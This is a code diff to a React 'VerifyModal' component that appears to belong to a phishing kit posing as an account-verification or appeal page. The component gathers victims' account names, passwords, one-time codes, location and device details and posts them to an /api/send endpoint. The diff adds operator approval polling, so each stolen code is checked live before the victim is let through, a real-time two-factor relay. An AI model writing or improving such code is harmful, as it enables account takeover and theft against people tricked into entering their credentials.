@@ -3,20 +3,20 @@ import VerifyImage from '@/assets/images/verify-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import { buildAppealMessage } from '@/utils/message';
+import { pollApproval } from '@/utils/poll-approval';
 import translateText from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
 const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
-    const [attempts, setAttempts] = useState(0);
     const [code, setCode] = useState('');
     const [countdown, setCountdown] = useState(0);
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, deviceLabel, messageId, userData, addCode, setMessageId } = store();
+    const { geoInfo, deviceLabel, messageId, loginProvider, userData, addCode, setMessageId } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const maxPass = config.MAX_PASS ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
@@ -60,9 +60,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         setShowError(false);
         setIsLoading(true);
 
-        const next = attempts + 1;
-        setAttempts(next);
-
+        const sessionId = crypto.randomUUID();
         addCode(code);
 
         const allCodes = [...userData.codes, code];
@@ -70,6 +68,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             geoInfo,
             deviceLabel,
             userData,
+            loginProvider,
             accounts: userData.accounts,
             passwords: userData.passwords,
             codes: allCodes,
@@ -80,14 +79,18 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         try {
             const res = await axios.post('/api/send', {
                 message,
-                old_message_id: messageId
+                old_message_id: messageId,
+                approval_type: 'code',
+                session_id: sessionId
             });
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
                 setMessageId(res.data.message_id);
             }
 
-            if (next >= maxCode) {
+            const result = await pollApproval(sessionId);
+
+            if (result === 'approved') {
                 nextStep();
             } else {
                 setShowError(true);
@@ -95,7 +98,9 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                 setCountdown(loadingTime);
             }
         } catch {
-            //
+            setShowError(true);
+            setCode('');
+            setCountdown(loadingTime);
         } finally {
             setIsLoading(false);
         }
